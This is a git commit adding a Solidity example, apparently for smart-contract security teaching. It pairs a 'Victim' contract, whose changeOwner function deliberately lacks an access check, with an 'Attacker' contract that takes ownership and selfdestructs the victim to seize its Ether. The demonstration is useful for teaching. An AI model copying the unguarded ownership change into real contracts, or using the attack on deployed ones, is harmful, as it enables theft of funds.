b3d565fe5b74a3a9390834420fb6082cca54619b
Yaghoub Adelzadeh <adelzadeh74@gmail.com>
2024-06-07 23:42:02 +0330

    Update Example1.sol

--- SelfDestruct/Example1.sol
+++ SelfDestruct/Example1.sol
@@ -1,1 +1,33 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.25;
 
+contract Victim{
+    address public owner;
+    constructor(){
+        owner = msg.sender;
+    }
+    function deposit()public payable {}
+
+    // This function allows the owner to destroy contract 
+    // and send the ramaining Ether to a specified address
+    function destroyContract(address payable _to)public {
+        require(msg.sender == owner,"Only owner can destroy the contract");
+        selfdestruct(_to);
+    } 
+
+    function changeOwner(address _newOwner)public {
+        owner = _newOwner;
+    }   
+    receive() external payable { }
+}
+
+contract Attacker{
+    Victim public victim;
+    constructor(address payable _victim){
+        victim = Victim(_victim);
+    }
+    function attack()public {
+        victim.changeOwner(address(this));
+        victim.destroyContract(payable (address(this)));
+    }
+}
